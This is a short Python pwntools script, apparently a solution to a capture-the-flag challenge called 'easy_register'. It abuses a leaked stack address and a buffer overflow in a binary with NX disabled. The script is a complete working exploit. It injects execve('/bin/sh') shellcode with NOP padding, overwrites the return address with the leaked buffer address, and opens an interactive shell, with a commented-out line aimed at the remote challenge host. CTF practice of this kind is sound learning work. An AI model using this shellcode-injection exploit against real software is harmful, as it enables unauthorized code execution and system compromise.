# This challenge has a stack leak(buffer's sddress) , NX disabled and bufferoverflow vulnerability.
# So we can inject our shellcode into the buffer , overflow it and then return to our shellcode to pop the shell.

from pwn import *

context.arch = "amd64"
shellcode = """
push rdx
pop rsi
mov rcx, 0x0068732f6e69622f
push rcx
mov rdi, rsp
mov al, 0x3b
syscall
"""

r = process("./easy_register")
#r = remote("easyregister.ctf.intigriti.io",7777)
r.recvuntil(b"Initialized attendee listing at ")
buffer_addr = r.recvuntil(b".")
buffer_addr = str(buffer_addr[0:len(buffer_addr)-1])
buffer_addr = int(buffer_addr[2:len(buffer_addr)-1],16)
log.info(f"The startimg address of the buffer is at: {hex(buffer_addr)}")
exploit = asm(shellcode) + b"\x90" * 68 + p64(buffer_addr)               # 20 bytes of shellcode + 68 bytes of nop instructions + buffer's address
r.sendlineafter('Hacker name >',exploit)
r.interactive()
